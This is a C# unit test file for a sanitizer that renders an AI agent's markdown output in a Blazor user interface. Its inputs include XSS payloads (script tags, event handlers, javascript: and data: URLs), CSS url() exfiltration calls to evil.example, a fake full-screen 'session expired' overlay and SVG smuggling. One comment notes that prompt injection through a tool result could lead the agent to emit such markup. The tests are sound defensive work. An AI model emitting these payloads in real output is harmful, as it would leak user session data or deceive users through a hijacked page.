using RockBot.UserProxy.Blazor.Services;

namespace RockBot.UserProxy.Blazor.Tests;

/// <summary>
/// Verifies <see cref="SafeMarkdownRenderer"/> renders the rich subset the agent is
/// permitted to emit and strips the vectors the design doc calls out: classic XSS
/// (script/iframe/event handlers), CSS-based data exfil (url() in style), UI hijack
/// (position/z-index/transform/opacity), and unsafe URL schemes.
/// </summary>
[TestClass]
public class SafeMarkdownRendererTests
{
    // ── Allowed: rich rendering subset ────────────────────────────────────

    [TestMethod]
    public void Renders_BasicMarkdown()
    {
        var html = SafeMarkdownRenderer.RenderSafe("**bold** and *italic*");

        StringAssert.Contains(html, "<strong>bold</strong>");
        StringAssert.Contains(html, "<em>italic</em>");
    }

    [TestMethod]
    public void Renders_FencedCode()
    {
        var html = SafeMarkdownRenderer.RenderSafe("```csharp\nvar x = 1;\n```");

        StringAssert.Contains(html, "<code");
        StringAssert.Contains(html, "var x = 1;");
    }

    [TestMethod]
    public void Renders_GfmTables()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "| col1 | col2 |\n|------|------|\n| a    | b    |");

        StringAssert.Contains(html, "<table");
        StringAssert.Contains(html, "<th>col1</th>");
        StringAssert.Contains(html, "<td>a</td>");
    }

    [TestMethod]
    public void Renders_Strikethrough()
    {
        var html = SafeMarkdownRenderer.RenderSafe("~~deleted~~");

        StringAssert.Contains(html, "<del>deleted</del>");
    }

    [TestMethod]
    public void Renders_TaskList_AsDisabledCheckboxes()
    {
        var html = SafeMarkdownRenderer.RenderSafe("- [x] done\n- [ ] todo");

        StringAssert.Contains(html, "type=\"checkbox\"");
        StringAssert.Contains(html, "disabled");
        StringAssert.Contains(html, "checked");
    }

    [TestMethod]
    public void Renders_InlineSvg()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "<svg width=\"100\" height=\"100\" viewBox=\"0 0 100 100\">" +
            "<circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"red\" />" +
            "</svg>");

        StringAssert.Contains(html, "<svg");
        StringAssert.Contains(html, "<circle");
        StringAssert.Contains(html, "fill=\"red\"");
    }

    [TestMethod]
    public void Renders_SafeColorSpan()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "Treat as <span style=\"color:red; font-weight:bold\">danger</span> please.");

        StringAssert.Contains(html, "<span");
        StringAssert.Contains(html, "color");
        StringAssert.Contains(html, "danger");
    }

    [TestMethod]
    public void Renders_Details_Summary()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "<details><summary>click</summary>hidden content</details>");

        StringAssert.Contains(html, "<details>");
        StringAssert.Contains(html, "<summary>click</summary>");
    }

    // ── Stripped: classic XSS vectors ─────────────────────────────────────

    [TestMethod]
    public void Strips_ScriptTag()
    {
        var html = SafeMarkdownRenderer.RenderSafe("hi <script>alert(1)</script> there");

        Assert.IsFalse(html.Contains("<script"), $"Script tag must be stripped. Got: {html}");
        Assert.IsFalse(html.Contains("alert(1)"), $"Script content must be stripped. Got: {html}");
    }

    [TestMethod]
    public void Strips_IframeTag()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "<iframe src=\"https://evil.example\"></iframe>");

        Assert.IsFalse(html.Contains("<iframe"), $"Iframe must be stripped. Got: {html}");
    }

    [TestMethod]
    public void Strips_StyleTag()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "<style>body { display:none }</style>visible");

        Assert.IsFalse(html.Contains("<style"), $"Style tag must be stripped. Got: {html}");
    }

    [TestMethod]
    public void Strips_OnclickAttribute()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "<span onclick=\"alert(1)\">click me</span>");

        Assert.IsFalse(html.Contains("onclick"), $"onclick must be stripped. Got: {html}");
        Assert.IsFalse(html.Contains("alert(1)"), $"Handler body must be stripped. Got: {html}");
    }

    [TestMethod]
    public void Strips_OnerrorAttribute()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "<img src=x onerror=\"alert(1)\">");

        Assert.IsFalse(html.Contains("onerror"), $"onerror must be stripped. Got: {html}");
    }

    [TestMethod]
    public void Strips_JavascriptUrlScheme()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "[click](javascript:alert(1))");

        Assert.IsFalse(html.Contains("javascript:"),
            $"javascript: scheme must be stripped. Got: {html}");
    }

    [TestMethod]
    public void Strips_DataUrlScheme()
    {
        // data: URLs can host inline HTML or JS-equivalent (data:text/html,...).
        var html = SafeMarkdownRenderer.RenderSafe(
            "[click](data:text/html,<script>alert(1)</script>)");

        Assert.IsFalse(html.Contains("data:"),
            $"data: scheme must be stripped. Got: {html}");
    }

    // ── Stripped: CSS-based data exfil ────────────────────────────────────

    [TestMethod]
    public void Strips_CssUrlInBackground()
    {
        // Primary CSS-exfil vector — agent (or prompt-injection through tool result)
        // produces <span style="background:url(https://evil/leak?session=...)">.
        var html = SafeMarkdownRenderer.RenderSafe(
            "<span style=\"background:url(https://evil.example/leak?s=abc)\">x</span>");

        Assert.IsFalse(html.Contains("url("),
            $"url() in CSS must be stripped. Got: {html}");
        Assert.IsFalse(html.Contains("evil.example"),
            $"External URL must not survive the sanitizer. Got: {html}");
    }

    [TestMethod]
    public void Strips_CssUrlInBackgroundImage()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "<span style=\"background-image:url(https://evil.example/leak.png)\">x</span>");

        Assert.IsFalse(html.Contains("background-image"),
            $"background-image with url() must be dropped. Got: {html}");
    }

    // ── Stripped: UI-hijack CSS ───────────────────────────────────────────

    [TestMethod]
    public void Strips_PositionFixed_FullScreenOverlay()
    {
        // The classic UI hijack: full-screen white overlay with a fake message.
        var html = SafeMarkdownRenderer.RenderSafe(
            "<div style=\"position:fixed; top:0; left:0; width:100%; height:100%; " +
            "z-index:99999; background:white\">Your session expired</div>");

        Assert.IsFalse(html.Contains("position"),
            $"CSS position must be dropped. Got: {html}");
        Assert.IsFalse(html.Contains("z-index"),
            $"CSS z-index must be dropped. Got: {html}");
        Assert.IsFalse(html.Contains("top:"),
            $"CSS top/left must be dropped. Got: {html}");
    }

    [TestMethod]
    public void Strips_TransformAndOpacity()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "<span style=\"transform:scale(100); opacity:0.01\">invisible</span>");

        Assert.IsFalse(html.Contains("transform"),
            $"transform must be dropped (UI hijack). Got: {html}");
        Assert.IsFalse(html.Contains("opacity"),
            $"opacity must be dropped (UI hijack). Got: {html}");
    }

    // ── Stripped: SVG-specific attack surface ─────────────────────────────

    [TestMethod]
    public void Strips_ScriptInsideSvg()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "<svg><script>alert(1)</script><circle cx=\"50\" cy=\"50\" r=\"40\" /></svg>");

        Assert.IsFalse(html.Contains("<script"),
            $"Script inside SVG must be stripped. Got: {html}");
        // The legitimate <circle> should survive.
        StringAssert.Contains(html, "<circle");
    }

    [TestMethod]
    public void Strips_ForeignObjectInsideSvg()
    {
        // <foreignObject> would smuggle arbitrary HTML inside SVG past most allowlists.
        var html = SafeMarkdownRenderer.RenderSafe(
            "<svg><foreignObject><div onclick=\"alert(1)\">hi</div></foreignObject></svg>");

        Assert.IsFalse(html.Contains("foreignObject"),
            $"foreignObject must be stripped from SVG. Got: {html}");
        Assert.IsFalse(html.Contains("onclick"),
            $"Smuggled event handler must be stripped. Got: {html}");
    }

    [TestMethod]
    public void Strips_SvgOnloadEventHandler()
    {
        var html = SafeMarkdownRenderer.RenderSafe(
            "<svg onload=\"alert(1)\"><circle cx=\"50\" cy=\"50\" r=\"40\" /></svg>");

        Assert.IsFalse(html.Contains("onload"),
            $"SVG onload handler must be stripped. Got: {html}");
        StringAssert.Contains(html, "<svg");   // legitimate svg survives
    }

    // ── Edge cases ────────────────────────────────────────────────────────

    [TestMethod]
    public void Empty_ReturnsEmpty()
    {
        Assert.AreEqual(string.Empty, SafeMarkdownRenderer.RenderSafe(string.Empty));
    }

    [TestMethod]
    public void Null_ReturnsEmpty()
    {
        Assert.AreEqual(string.Empty, SafeMarkdownRenderer.RenderSafe(null));
    }

    [TestMethod]
    public void PlainText_PassesThrough()
    {
        var html = SafeMarkdownRenderer.RenderSafe("just plain text");

        StringAssert.Contains(html, "just plain text");
    }
}
